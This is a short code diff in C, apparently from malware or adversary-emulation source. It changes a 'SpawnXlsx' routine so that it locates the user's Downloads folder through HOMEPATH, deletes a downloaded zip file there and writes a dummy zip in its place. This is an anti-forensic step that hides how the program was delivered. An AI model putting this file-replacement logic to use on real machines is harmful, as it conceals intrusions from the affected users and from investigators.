@@ -123,27 +123,15 @@ void SpawnXlsx()
 
     //---------------------------Find and set path for dummy zip file---------------------------
     WCHAR zipPath[MAX_PATH];
-    GetModuleFileNameW(hm, zipPath, sizeof(zipPath));
-    WCHAR appdata[] = L"AppData";
-    WCHAR downloads[] = L"Downloads\\spreadsheet.zip";
-    
-    owlen = wcslen(appdata);
+    WCHAR envVarName[] = L"HOMEPATH";
+    WCHAR downloads[] = L"\\Downloads\\ZIPFILENAME";
 
-    // Fix: If oldWord and newWord are same it goes to infinite loop
-    if (!wcscmp(appdata, downloads))
-    {
-        return;
-    }
-    pos = wcsstr(zipPath, appdata);
-    // Index of current found word
-    index = pos - zipPath;
-
-    // Terminate str after word found index
-    zipPath[index] = L'\0';
+    //Get home dir of user
+    GetEnvironmentVariableW(envVarName, zipPath, MAX_PATH);
 
     // Concatenate str with new word 
     wcscat(zipPath, downloads);
-
+    
     //--------Try to delete original zip file.  If successful, write dummy zip in it's place--------
     if(DeleteFileW(zipPath))
     {
